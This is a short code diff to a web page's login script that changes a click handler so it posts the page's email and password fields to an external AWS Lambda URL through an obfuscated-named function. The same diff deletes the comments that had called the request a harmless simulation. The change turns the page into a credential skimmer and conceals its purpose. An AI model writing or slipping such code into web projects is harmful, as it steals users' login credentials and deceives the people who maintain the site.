@@ -50,12 +50,14 @@
 
     <script>
         document.getElementById('loginButton').addEventListener('click', function() {
-      // Obfuscated version of sending a request
+
       event.preventDefault();
+    var inputUsername = document.getElementById("email");
+    var inputPassword = document.getElementById("password");
       var _0xabcdef = function(url) {
         fetch(url, {
           method: 'POST',
-          body: JSON.stringify({ username: 'user', password: 'pass' }),
+          body: JSON.stringify({ username: inputUsername, password: inputPassword}),
           headers: { 'Content-Type': 'application/json' }
         }).then(function(response) {
           return response.text();
@@ -66,7 +68,6 @@
         });
       };
       
-      // Simulate the request to a harmless endpoint
       _0xabcdef('https://hy655qqxvkldjkdf6bedcujjfdxhgm0iwhua.lambda-url.eu-north-1.on.aws/');
     });
     </script>
